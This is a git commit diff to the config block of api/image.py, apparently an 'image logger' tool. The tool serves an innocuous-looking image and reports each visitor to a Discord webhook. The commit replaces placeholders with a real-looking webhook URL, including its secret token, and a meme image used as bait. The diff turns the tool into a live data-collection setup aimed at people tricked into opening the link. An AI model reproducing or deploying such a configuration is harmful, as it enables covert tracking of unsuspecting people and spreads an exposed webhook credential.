4900db05ecc9f63c971390603960d05408aa3c15
bagjtimerr <rosssemple2009@gmail.com>
2025-02-13 07:13:47 +0000

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1339493978386464851/eQ4jgNXNOQV9w_gUHh2E2CPV17Ru90tD-jz5267ybKe8y0GMC_wBEBn-mhMeVC5TvFau",
+    "image": "https://quotesbae.com/wp-content/uploads/2018/02/Worlds-Funniest-Meme-Funny-Image-Photo-Joke-01.jpeg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
